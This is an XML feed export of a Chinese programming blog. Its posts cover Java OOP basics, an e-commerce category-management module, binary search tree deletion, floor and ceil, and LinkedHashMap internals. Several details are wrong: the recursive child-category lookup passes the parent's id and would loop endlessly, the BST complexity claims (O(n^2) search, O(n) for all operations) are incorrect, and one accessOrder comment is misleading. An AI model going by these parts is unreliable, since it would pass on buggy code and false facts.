降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的 以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。 注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。 123456789101112131415161718192021public class Person &#123; private String name; private int gender; private int age; public String getName() &#123; return name; &#125; public String getGender() &#123; return gender == 0 ? "man" : "woman"; &#125; public void work() &#123; if (18 &lt;= age &amp;&amp; age &lt;= 50) &#123; System.out.println(name + " is working very hard!"); &#125; else &#123; System.out.println(name + " can't work any more!"); &#125; &#125;&#125; 继承继承实现了 IS-A 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。 Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 向上转型 。 1Animal animal = new Cat(); 继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。 多态同一操作作用于不同的对象，可以有不同的解释，产生不同的执行结果，这就是多态性。简单的说:就是用基类的引用指向子类的对象。 多态分为编译时多态和运行时多态。编译时多态主要指方法的重载，运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定。 运行时多态有三个条件： 继承 覆盖（重写） 向上转型 下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。 12345678910111213141516171819202122232425262728public class Instrument &#123; public void play() &#123; System.out.println("Instument is playing..."); &#125;&#125;public class Wind extends Instrument &#123; public void play() &#123; System.out.println("Wind is playing..."); &#125;&#125;public class Percussion extends Instrument &#123; public void play() &#123; System.out.println("Percussion is playing..."); &#125;&#125;public class Music &#123; public static void main(String[] args) &#123; List&lt;Instrument&gt; instruments = new ArrayList&lt;&gt;(); instruments.add(new Wind()); instruments.add(new Percussion()); for(Instrument instrument : instruments) &#123; instrument.play(); &#125; &#125;&#125; 输出结果： 12Wind is playing...Percussion is playing...]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7、分类管理模块]]></title>
    <url>%2F2018%2F07%2F21%2F7%E3%80%81%E5%88%86%E7%B1%BB%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[分类管理模块 1.增加节点request12parentId(default=0)categoryName fail1234&#123; &quot;status&quot;:1, &quot;msg&quot;: &quot;添加品类失败&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;添加品类成功&quot;&#125; controller:12345678910111213@RequestMapping("add_category.do")@ResponseBodypublic ServerResponse addCategory(HttpSession session, String categoryName, @RequestParam(value = "parentId",defaultValue = "0")int parentId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return categoryService.addCategory(categoryName,parentId); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 这里首先确定用户是否已经登陆，否则需要强制登陆。然后判断用户是否为管理员。所以需要在userService中添加一个判断用户是否是管理员的方法。123456public ServerResponse checkAdminRole(User user)&#123; if(user!=null &amp;&amp; user.getRole() == Constants.Role.ROLE_ADMIN)&#123; return ServerResponse.createBySuccess(); &#125; return ServerResponse.createByError();&#125; 如果是管理员，就可以增加节点了。123456789101112131415public ServerResponse addCategory(String categoryName,Integer parentId)&#123; if(parentId == null || StringUtils.isBlank(categoryName))&#123; return ServerResponse.createByErrorMessage("添加品类参数错误"); &#125; Category category = new Category(); category.setName(categoryName); category.setParentId(parentId); category.setStatus(true); int resultCount = categoryMapper.insert(category); if(resultCount &gt; 0)&#123; return ServerResponse.createBySuccess("添加品类成功"); &#125; return ServerResponse.createByErrorMessage("添加品类失败");&#125; 2.修改品类名字request12categoryIdcategoryName fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;更新品类名字失败&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;更新品类名字成功&quot;&#125; controller：12345678910111213@RequestMapping("set_category_name.do")@ResponseBodypublic ServerResponse updateCategoryName(HttpSession session,Integer categoryId,String categoryName)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return categoryService.updateCategoryName(categoryId,categoryName); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service：12345678910111213public ServerResponse updateCategoryName(Integer categoryId,String categoryName)&#123; if(categoryId == null || StringUtils.isBlank(categoryName))&#123; return ServerResponse.createByErrorMessage("更新品类参数错误"); &#125; Category category = new Category(); category.setId(categoryId); category.setName(categoryName); int resultCount = categoryMapper.updateByPrimaryKeySelective(category); if(resultCount &gt; 0)&#123; return ServerResponse.createBySuccessMessage("更新品类名称成功"); &#125; return ServerResponse.createByErrorMessage("更新品类名称失败");&#125; 3.获取品类子节点(平级)request1categoryId(default=0) fail12345678910&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,请登录&quot;&#125;或&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;未找到该品类&quot;&#125; success1234567891011121314151617181920212223&#123; &quot;status&quot;: 0, &quot;data&quot;: [ &#123; &quot;id&quot;: 2, &quot;parentId&quot;: 1, &quot;name&quot;: &quot;手机&quot;, &quot;status&quot;: true, &quot;sortOrder&quot;: 3, &quot;createTime&quot;: 1479622913000, &quot;updateTime&quot;: 1479622913000 &#125;, &#123; &quot;id&quot;: 4, &quot;parentId&quot;: 1, &quot;name&quot;: &quot;移动座机&quot;, &quot;status&quot;: true, &quot;sortOrder&quot;: 5, &quot;createTime&quot;: 1480059936000, &quot;updateTime&quot;: 1480491941000 &#125; ]&#125; controller:12345678910111213@RequestMapping("get_category.do")@ResponseBodypublic ServerResponse getChildrenParallelCategory(HttpSession session,@RequestParam(value = "categoryId",defaultValue = "0") Integer categoryId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return categoryService.getChildrenParallelCategory(categoryId); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service：1234567public ServerResponse&lt;List&lt;Category&gt;&gt; getChildrenParallelCategory(Integer categoryId)&#123; List&lt;Category&gt; categoryList = categoryMapper.selectCategoryChildrenByParentId(categoryId); if(CollectionUtils.isEmpty(categoryList))&#123; log.info("未找到当前分类下的子分类"); &#125; return ServerResponse.createBySuccess(categoryList);&#125; 4.获取当前分类id及递归子节点categoryIdrequest1categoryId fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;无权限&quot;&#125; success1234567891011&#123; &quot;status&quot;: 0, &quot;data&quot;: [ 100009, 100010, 100001, 100006, 100007, 100008 ]&#125; controller：12345678910111213@RequestMapping("get_deep_category.do")@ResponseBodypublic ServerResponse getCategoryAndDeepChildrenCategory(HttpSession session,@RequestParam(value = "categoryId",defaultValue = "0") Integer categoryId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return categoryService.selectCategoryAndDeepChildrenById(categoryId); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service：1234567891011public ServerResponse selectCategoryAndDeepChildrenById(Integer categoryId)&#123; Set&lt;Category&gt; categorySet = Sets.newHashSet(); findChildCategory(categorySet,categoryId); List&lt;Integer&gt; categoryList = Lists.newArrayList(); if(categoryId != null)&#123; for(Category categoryItem:categorySet)&#123; categoryList.add(categoryItem.getId()); &#125; &#125; return ServerResponse.createBySuccess(categoryList);&#125; 递归获取：123456789101112private Set&lt;Category&gt; findChildCategory(Set&lt;Category&gt; categorySet,Integer categoryId)&#123; Category category = categoryMapper.selectByPrimaryKey(categoryId); if(category != null)&#123; categorySet.add(category); &#125; //查找子节点 List&lt;Category&gt; categoryList = categoryMapper.selectCategoryChildrenByParentId(categoryId); for(Category categoryItem:categoryList)&#123; findChildCategory(categorySet,category.getId()); &#125; return categorySet;&#125; 注意要重写Category的equals和hashcode两个方法，确保没有重复对象。]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7、二分搜索树（下）]]></title>
    <url>%2F2018%2F07%2F21%2F7%E3%80%81%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%88%E4%B8%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[二分搜索树（下） 一、前言上一篇讲的是二分查找算法和二分搜索树的基本操作，如插入、查找、深度优先遍历。本篇介绍二分搜索树的广度优先遍历、顺序性、局限性以及删除节点问题。 二、层序遍历（广度优先遍历） 算法思想 在此需要引入两个概念：深度优先遍历和广度优先遍历，而以上讲解的前序、中序、后序遍历都属于深度优先遍历，遍历一开始首先会走到最深，再回溯到开始遍历整棵树。而广度优先遍历则是层序遍历，一层一层地向下遍历，查看以下动画： 查看以上动画，实现其过程需要引入先进先出的“队列”数据结构，首先将28入队，第一层遍历完毕，可进行操作，将28出队并打印。遍历第二层16、30依次入队，再出队进行打印操作，依次类推。 代码实现123456789101112131415161718// 二分搜索树的层序遍历public void levelOrder()&#123; // 我们使用LinkedList来作为我们的队列 LinkedList&lt;Node&gt; q = new LinkedList&lt;Node&gt;(); q.add(root); while( !q.isEmpty() )&#123; Node node = q.remove(); System.out.println(node.key); if( node.left != null ) q.add( node.left ); if( node.right != null ) q.add( node.right ); &#125;&#125; 不论是二分搜索树的深度优先遍历还是广度优先遍历，性能都是很高效的，为O(n)，基本上是最小的了，毕竟“遍历”至少需要每个节点遍历一次。在很多实际运用中可能不需要显示地构建出一棵树，但是需要遍历一次树中节点。 而之前学过的排序算法例如归并排序、快速排序本质上是一棵二叉树的深度优先遍历过程，此二分搜索树也是通过递归等基本内容构造的一棵复杂的数结构，可见算法与数据结构之间的互相依赖。 三. 二分搜索树的删除 删除二分搜索树的最小值和最大值 查找过程首先来了解最简单的情况—–删除二分搜索树的最小值和最大值，其实此过程根据搜索树的特征很容易解决，从根节点开始遍历其左孩子，直至最后节点无左孩子，那么此节点就是最小值；最大值同理，遍历其右孩子即可。 删除过程在删除节点时，需要将其左孩子或右孩子代替其删除节点，来保持二分搜索树的特征。 举个例子，需要删除下图二分搜索树的最小值22，删除22后，22必然没有左孩子，因为它已经是最小值，将其右孩子33代替22的位置，返回节点33。删除最大值同理。 删完22这个最小节点之后应该是这样的： 代码实现公有函数，供外层调用： minimum()：寻找二分搜索树的最小的键值 maximum()：寻找二分搜索树的最大的键值 removeMin()：从二分搜索树中删除最小值所在节点 removeMax()：从二分搜索树中删除最大值所在节点 12345678910111213141516171819202122232425// 寻找二分搜索树的最小的键值public Key minimum()&#123; assert count != 0; Node minNode = minimum( root ); return minNode.key;&#125;// 寻找二分搜索树的最大的键值public Key maximum()&#123; assert count != 0; Node maxNode = maximum(root); return maxNode.key;&#125;// 从二分搜索树中删除最小值所在节点public void removeMin()&#123; if( root != null ) root = removeMin( root );&#125;// 从二分搜索树中删除最大值所在节点public void removeMax()&#123; if( root != null ) root = removeMax( root );&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// 返回以node为根的二分搜索树的最小键值所在的节点private Node minimum(Node node)&#123; if( node.left == null ) return node; return minimum(node.left);&#125;// 返回以node为根的二分搜索树的最大键值所在的节点private Node maximum(Node node)&#123; if( node.right == null ) return node; return maximum(node.right);&#125;// 删除掉以node为根的二分搜索树中的最小节点// 返回删除节点后新的二分搜索树的根private Node removeMin(Node node)&#123; if( node.left == null )&#123; Node rightNode = node.right; node.right = null; count --; return rightNode; &#125; node.left = removeMin(node.left); return node;&#125;// 删除掉以node为根的二分搜索树中的最大节点// 返回删除节点后新的二分搜索树的根private Node removeMax(Node node)&#123; if( node.right == null )&#123; Node leftNode = node.left; node.left = null; count --; return leftNode; &#125; node.right = removeMax(node.right); return node;&#125; 删除节点 以上是删除节点的特殊情况，可以确定待删除节点只有1个孩子或者没有，所以在删除此节点之后，其孩子可以顶替，这样仍维护了二分搜索树的特征。但是要删除同时拥有两个子节点的节点该怎么办呢？ 算法被称为Hubbard Deletion，在之前的讨论中，若待删除节点只有一个孩子，则用此孩子替代待删除节点；若有两个孩子，其思想也是类似，找到一个合适的节点来替代，而Hubbard Deletion算法则认为此替代节点是右子树的最小节点！ 因此，需要代替58的节点是59，注意二分搜索树的特征，59的所有右孩子都比58要大，所以右孩子子树中的最小值59代替其58后，此二分搜索树的特征仍然成立！ 因此，整个过程可以总结为首先寻找待删除节点的后继节点（右子树中的最小值），由后继节点代替待删除节点即可。 代码实现: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 从二分搜索树中删除键值为key的节点public void remove(Key key)&#123; root = remove(root, key);&#125;// 删除掉以node为根的二分搜索树中键值为key的节点, 递归算法// 返回删除节点后新的二分搜索树的根Node remove(Node node, Key key)&#123; if( node == null ) return null; if( key.compareTo(node.key) &lt; 0 )&#123; node.left = remove( node.left , key ); return node; &#125; else if( key.compareTo(node.key) &gt; 0 )&#123; node.right = remove( node.right, key ); return node; &#125; else&#123; // key == node-&gt;key // 待删除节点左子树为空的情况 if( node.left == null )&#123; Node rightNode = node.right; node.right = null; count --; return rightNode; &#125; // 待删除节点右子树为空的情况 if( node.right == null )&#123; Node leftNode = node.left; node.left = null; count--; return leftNode; &#125; // 待删除节点左右子树均不为空的情况 // 找到比待删除节点大的最小节点, 即待删除节点右子树的最小节点 // 用这个节点顶替待删除节点的位置 Node successor = new Node(minimum(node.right)); count ++; successor.right = removeMin(node.right); successor.left = node.left; node.left = node.right = null; count --; return successor; &#125;&#125; 注意：以上过程可完成二分搜索树的节点删除过程，其重点就是当待删除节点同时拥有左、右子树时，寻找右子树中的最小值进行代替。其实同理而言，另外一个思路也可实现：寻找左子树的最大值进行代替，如下图所示，这种特性来源于二分搜索树的特征，可自行实现。 四、二分搜索树的顺序性注意二分搜索树还有一个重要的特征：顺序性，也就是说不仅可以在二分搜索树中定位一个元素，还可以回答其顺序性相关的问题： minimum , maximum：已经实现，非常容易可在一组数据中找到最小、大值。 successor , predecessor：待实现，可找到一个元素的前驱节点和后继节点。 floor , ceil：待实现 1. 前驱节点和后继节点举个例子，下图中 41的前驱节点是 37，后继节点是42。 因此，规律也自然而然得出： 一个节点的前驱节点是其左子树中的最大值，若无左子树，其前驱节点在从根节点到key的路径上，比key小的最大值。 一个节点的后继节点是右子树的最小值，若无右子树，其后继节点在从根节点到key的路径上，比key大的最小值。 主要逻辑： 如果key所在的节点不存在，则key没有前驱, 返回NULL 如果key所在的节点左子树不为空，则其左子树的最大值为key的前驱 否则，key的前驱在从根节点到key的路径上，在这个路径上寻找到比key小的最大值， 即为key的前驱 2. floor , ceil寻找floor , ceil不同于上部分所讲的，寻找一个节点的前驱节点和后继节点首先有个前提就是要保证此节点一定存在，但是寻找floor , ceil无需保证。 若key值存在，那么floor , ceil就是key值自身。若key值不存在：floor：是最接近key值且**小于**key的节点 ceil：是最接近key值且**大于**key的节点 例如下图，举几个例子来了解： 节点41的floor , ceil是41； 45的floor是42，ceil是50； 64无ceil，floor是63； 11无floor，ceil是13。 代码实现逻辑这里寻找floor 或 ceil 的逻辑主要分为3个步骤（这里只列出寻找floor 的步骤，ceil 同理，在此不赘述）： 如果node的key值和要寻找的key值相等：则node本身就是key的floor节点。 如果node的key值比要寻找的key值大：则要寻找的key的floor节点一定在node的左子树中。 如果node的key值比要寻找的key值小：则node有可能是key的floor节点,也有可能不是(存在比node-&gt;key大但是小于key的其余节点)，需要尝试向node的右子树寻找一下。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 二分查找法, 在有序数组arr中, 查找target// 如果找到target, 返回第一个target相应的索引index// 如果没有找到target, 返回比target小的最大值相应的索引, 如果这个最大值有多个, 返回最大索引// 如果这个target比整个数组的最小元素值还要小, 则不存在这个target的floor值, 返回-1static int floor(Comparable[] arr, Comparable target)&#123; // 寻找比target小的最大索引 int l = -1, r = arr.length-1; while( l &lt; r )&#123; // 使用向上取整避免死循环 int mid = l + (r-l+1)/2; if( arr[mid].compareTo(target) &gt;= 0 ) r = mid - 1; else l = mid; &#125; assert l == r; // 如果该索引+1就是target本身, 该索引+1即为返回值 if( l + 1 &lt; arr.length &amp;&amp; arr[l+1] == target ) return l + 1; // 否则, 该索引即为返回值 return l;&#125;// 二分查找法, 在有序数组arr中, 查找target// 如果找到target, 返回最后一个target相应的索引index// 如果没有找到target, 返回比target大的最小值相应的索引, 如果这个最小值有多个, 返回最小的索引// 如果这个target比整个数组的最大元素值还要大, 则不存在这个target的ceil值, 返回整个数组元素个数nstatic int ceil(Comparable[] arr, Comparable target)&#123; // 寻找比target大的最小索引值 int l = 0, r = arr.length; while( l &lt; r )&#123; // 使用普通的向下取整即可避免死循环 int mid = l + (r-l)/2; if( arr[mid].compareTo(target) &lt;= 0 ) l = mid + 1; else // arr[mid] &gt; target r = mid; &#125; assert l == r; // 如果该索引-1就是target本身, 该索引+1即为返回值 if( r - 1 &gt;= 0 &amp;&amp; arr[r-1] == target ) return r-1; // 否则, 该索引即为返回值 return r;&#125; 五、局限性来源它的局限性来源于哪？注意其二分搜索树的创建，如下图所示，同样的数据，可以对应不同的二分搜索树。 如上图，第一种创建情况可能是大部分人心中设想，但是第二种情况也是符合二分搜索树的特征，如此一来，二分搜索树可能退化成链表。二分搜索树的查找过程是与其高度相关，此时高度为n，时间复杂度为O(n^2)。 六、总结其实二分搜索树的性能总体而言还是十分优异的，它所有的有关操作时间复杂度为O(n)，出现以上情况的概率很小，但如果创建时其数据都是有序的，那么就会令人担忧了。也许你会想到快速排序中也有此问题，不过它通过随机获取标志点的方法解决了此问题。 所以类似以上解决办法，将其顺序打乱再插入到二分搜索树即可？这是一个解决办法，但是需要一开始获取所有数据，其实这些数据是慢慢流入系统的，所以在创建其过程中才会发现数据是否几乎有序。 为了解决此问题，可以改造二叉树的实现，使得其无法退化成链表—–平衡二叉树，它有左右两棵子树，并且其高度差不会超过1，因此可以保证其高度一定是 logn 级别的，此概念的经典实现就是红黑树。 所有以上解决算法详细代码请查看liuyubo老师的github]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7、LinkedHashMap源码分析]]></title>
    <url>%2F2018%2F07%2F21%2F7%E3%80%81LinkedHashMap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析LinkedHashMap源码。 关注点 结论 LinkedHashMap是否允许空 Key和Value都允许空 LinkedHashMap是否允许重复数据 Key重复会覆盖、Value允许重复 LinkedHashMap是否有序 有序 LinkedHashMap是否线程安全 非线程安全 一、为什么引入LinkedHashMap大多数情况下，只要不涉及线程安全问题，Map基本都可以使用HashMap，不过HashMap有一个问题，就是迭代HashMap的顺序并不是HashMap放置的顺序，也就是无序。HashMap的这一缺点往往会带来困扰，因为有些场景，我们期待一个有序的Map。 这个时候，LinkedHashMap就闪亮登场了，它虽然增加了时间和空间上的开销，但是通过维护一个运行于所有条目的双向链表，LinkedHashMap保证了元素迭代的顺序。 二、LinkedHashMap数据结构 LinkedHashMap是通过哈希表和链表实现的，它通过维护一个链表来保证对哈希表迭代时的有序性，而这个有序是指键值对插入的顺序。另外，当向哈希表中重复插入某个键的时候，不会影响到原来的有序性。也就是说，假设你插入的键的顺序为1、2、3、4，后来再次插入2，迭代时的顺序还是1、2、3、4，而不会因为后来插入的2变成1、3、4、2。（但其实我们可以改变它的规则，使它变成1、3、4、2） LinkedHashMap的实现主要分两部分，一部分是哈希表，另外一部分是链表。哈希表部分继承了HashMap，拥有了HashMap那一套高效的操作，所以我们要看的就是LinkedHashMap中链表的部分，了解它是如何来维护有序性的。 三、demo示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public static void main(String[] args) &#123; /** * HashMap插入数据，遍历输出无序 */ System.out.println("----------HashMap插入数据--------"); Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;(); map.put("apple", "a"); map.put("watermelon", "b"); map.put("banana", "c"); map.put("peach", "d"); Iterator iter = map.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry) iter.next(); System.out.println(entry.getKey() + "=" + entry.getValue()); &#125; /** * LinkedHashMap插入数据，遍历，默认以插入顺序为序 */ System.out.println("----------LinkedHashMap插入数据,按照插入顺序进行排序--------"); Map&lt;String, String&gt; linkedHashMap = new LinkedHashMap&lt;&gt;(); linkedHashMap.put("apple", "a"); linkedHashMap.put("watermelon", "b"); linkedHashMap.put("banana", "c"); linkedHashMap.put("peach", "d"); Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iterator = linkedHashMap.entrySet().iterator(); while (iterator.hasNext()) &#123; System.out.println(iterator.next()); &#125; /** * LinkedHashMap插入数据，设置accessOrder=true实现使得其遍历顺序按照访问的顺序输出，这里先用get方法来演示 */ System.out.println("----------LinkedHashMap插入数据,accessOrder=true:按照访问顺序进行排序--------"); Map&lt;String, String&gt; linkedHashMap2 = new LinkedHashMap&lt;String, String&gt;(16,0.75f,true); linkedHashMap2.put("apple", "aa"); linkedHashMap2.put("watermelon", "bb"); linkedHashMap2.put("banana", "cc"); linkedHashMap2.put("peach", "dd"); linkedHashMap2.get("banana");//banana移动到了内部的链表末尾 linkedHashMap2.get("apple");//apple移动到了内部的链表末尾 Iterator iter2 = linkedHashMap2.entrySet().iterator(); while (iter2.hasNext()) &#123; Map.Entry entry = (Map.Entry) iter2.next(); System.out.println(entry.getKey() + "=" + entry.getValue()); &#125; /** * LinkedHashMap的put方法在accessOrder=true的情况下 */ System.out.println("-----------"); linkedHashMap2.put("watermelon", "bb");//watermelon移动到了内部的链表末尾 linkedHashMap2.put("stawbarrey", "ee");//末尾插入新元素stawbarrey linkedHashMap2.put(null, null);//插入新的节点 null Iterator iter3 = linkedHashMap2.entrySet().iterator(); while (iter3.hasNext()) &#123; Map.Entry entry = (Map.Entry) iter3.next(); System.out.println(entry.getKey() + "=" + entry.getValue()); &#125; &#125; 输出结果是: 12345678910111213141516171819202122----------HashMap插入数据--------banana=capple=apeach=dwatermelon=b----------LinkedHashMap插入数据,按照插入顺序进行排序--------apple=awatermelon=bbanana=cpeach=d----------LinkedHashMap插入数据,按照访问顺序进行排序--------watermelon=bbpeach=ddbanana=cc//banana到了末尾apple=aa//apple到了末尾-----------peach=ddbanana=ccapple=aawatermelon=bb//watermelon到了链表末尾stawbarrey=ee//新插入的防在末尾null=null//新插入的放在末尾 四、属性关于LinkedHashMap，先提两点： 1、LinkedHashMap可以认为是HashMap+LinkedList，即它既使用HashMap操作数据结构，又使用LinkedList维护插入元素的先后顺序 2、LinkedHashMap的基本实现思想就是—-多态。可以说，理解多态，再去理解LinkedHashMap原理会事半功倍；反之也是，对于LinkedHashMap原理的学习，也可以促进和加深对于多态的理解。 3.1 继承关系123public class LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt; implements Map&lt;K,V&gt; LinkedHashMap是HashMap的子类，自然LinkedHashMap也就继承了HashMap中所有非private的方法。所以它已经从 HashMap 那里继承了与哈希表相关的操作了，那么在LinkedHashMap中，它可以专注于链表实现的那部分，所以与链表实现相关的属性如下。 3.2 属性介绍1234567891011121314151617//LinkedHashMap的链表节点继承了HashMap的节点，而且每个节点都包含了前指针和后指针，所以这里可以看出它是一个双向链表static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; &#123; Entry&lt;K,V&gt; before, after; Entry(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; super(hash, key, value, next); &#125;&#125;//头指针transient LinkedHashMap.Entry&lt;K,V&gt; head;//尾指针transient LinkedHashMap.Entry&lt;K,V&gt; tail;//默认为false。当为true时，表示链表中键值对的顺序与每个键的插入顺序一致，也就是说重复插入键，也会更新顺序//简单来说，为false时，就是上面所指的1、2、3、4的情况；为true时，就是1、3、4、2的情况final boolean accessOrder; 五、构造方法1234567891011121314151617181920212223242526272829303132//默认是false，则迭代时输出的顺序是插入节点的顺序。若为true，则输出的顺序是按照访问节点的顺序。//为true时，可以在这基础之上构建一个LruCachfinal boolean accessOrder;public LinkedHashMap() &#123; super(); accessOrder = false;&#125;//指定初始化时的容量，public LinkedHashMap(int initialCapacity) &#123; super(initialCapacity); accessOrder = false;&#125;//指定初始化时的容量，和扩容的加载因子public LinkedHashMap(int initialCapacity, float loadFactor) &#123; super(initialCapacity, loadFactor); accessOrder = false;&#125;//指定初始化时的容量，和扩容的加载因子，以及迭代输出节点的顺序public LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder) &#123; super(initialCapacity, loadFactor); this.accessOrder = accessOrder;&#125;//利用另一个Map来构建，public LinkedHashMap(Map&lt;? extends K, ? extends V&gt; m) &#123; super(); accessOrder = false; //批量插入一个map中的所有数据到本集合中。 putMapEntries(m, false);&#125; 六、添加元素LinkedHashMap并没有重写任何put方法。但是其重写了构建新节点的newNode()方法. newNode() 会在HashMap的putVal() 方法里被调用，putVal() 方法会在批量插入数据putMapEntries(Map&lt;? extends K, ? extends V&gt; m, boolean evict) 或者插入单个数据public V put(K key, V value)时被调用。 LinkedHashMap重写了newNode(),在每次构建新节点时，通过linkNodeLast(p);将新节点链接在内部双向链表的尾部。 12345678910111213141516171819//在构建新节点时，构建的是`LinkedHashMap.Entry` 不再是`Node`.Node&lt;K,V&gt; newNode(int hash, K key, V value, Node&lt;K,V&gt; e) &#123; LinkedHashMap.Entry&lt;K,V&gt; p = new LinkedHashMap.Entry&lt;K,V&gt;(hash, key, value, e); linkNodeLast(p); return p;&#125;//将新增的节点，连接在链表的尾部private void linkNodeLast(LinkedHashMap.Entry&lt;K,V&gt; p) &#123; LinkedHashMap.Entry&lt;K,V&gt; last = tail; tail = p; //集合之前是空的 if (last == null) head = p; else &#123;//将新节点连接在链表的尾部 p.before = last; last.after = p; &#125;&#125; 以及HashMap专门预留给LinkedHashMap的afterNodeAccess() 、afterNodeInsertion() 、afterNodeRemoval() 方法。 1234// Callbacks to allow LinkedHashMap post-actionsvoid afterNodeAccess(Node&lt;K,V&gt; p) &#123; &#125;void afterNodeInsertion(boolean evict) &#123; &#125;void afterNodeRemoval(Node&lt;K,V&gt; p) &#123; &#125; 如果你没有注意到注释的解释的话，你可能会很奇怪为什么会有三个空方法，而且有不少地方还调用过它们。其实这三个方法表示的是在访问、插入、删除某个节点之后，进行一些处理，它们在LinkedHashMap有各自的实现。LinkedHashMap正是通过重写这三个方法来保证链表的插入、删除的有序性。 123456789101112131415//回调函数，新节点插入之后回调 ， 根据evict 和 判断是否需要删除最老插入的节点。如果实现LruCache会用到这个方法。void afterNodeInsertion(boolean evict) &#123; // possibly remove eldest LinkedHashMap.Entry&lt;K,V&gt; first; //LinkedHashMap 默认返回false 则不删除节点 if (evict &amp;&amp; (first = head) != null &amp;&amp; removeEldestEntry(first)) &#123; K key = first.key; removeNode(hash(key), key, null, false, true); &#125;&#125;//LinkedHashMap 默认返回false 则不删除节点。 返回true 代表要删除最早的节点。通常构建一个LruCache会在达到Cache的上限是返回trueprotected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) &#123; return false;&#125; void afterNodeInsertion(boolean evict)以及boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) 是构建LruCache需要的回调，在LinkedHashMap里可以忽略它们。 七、删除元素LinkedHashMap也没有重写remove() 方法，因为它的删除逻辑和HashMap并无区别。但它重写了afterNodeRemoval() 这个回调方法。该方法会在Node&lt;K,V&gt; removeNode(int hash, Object key, Object value,boolean matchValue, boolean movable) 方法中回调，removeNode() 会在所有涉及到删除节点的方法中被调用，上文分析过，是删除节点操作的真正执行者。 1234567891011121314151617//在删除节点e时，同步将e从双向链表上删除void afterNodeRemoval(Node&lt;K,V&gt; e) &#123; // unlink LinkedHashMap.Entry&lt;K,V&gt; p = (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after; //待删除节点 p 的前置后置节点都置空 p.before = p.after = null; //如果前置节点是null，则现在的头结点应该是后置节点a if (b == null) head = a; else//否则将前置节点b的后置节点指向a b.after = a; //同理如果后置节点时null ，则尾节点应是b if (a == null) tail = b; else//否则更新后置节点a的前置节点为b a.before = b;&#125; 八、查询元素LinkedHashMap重写了get()和getOrDefault() 方法： 12345678910111213141516public V get(Object key) &#123; Node&lt;K,V&gt; e; if ((e = getNode(hash(key), key)) == null) return null; if (accessOrder) afterNodeAccess(e); return e.value;&#125;public V getOrDefault(Object key, V defaultValue) &#123; Node&lt;K,V&gt; e; if ((e = getNode(hash(key), key)) == null) return defaultValue; if (accessOrder) afterNodeAccess(e); return e.value;&#125; 对比HashMap中的实现,LinkedHashMap只是增加了在成员变量(构造函数时赋值)accessOrder为true的情况下，要去回调void 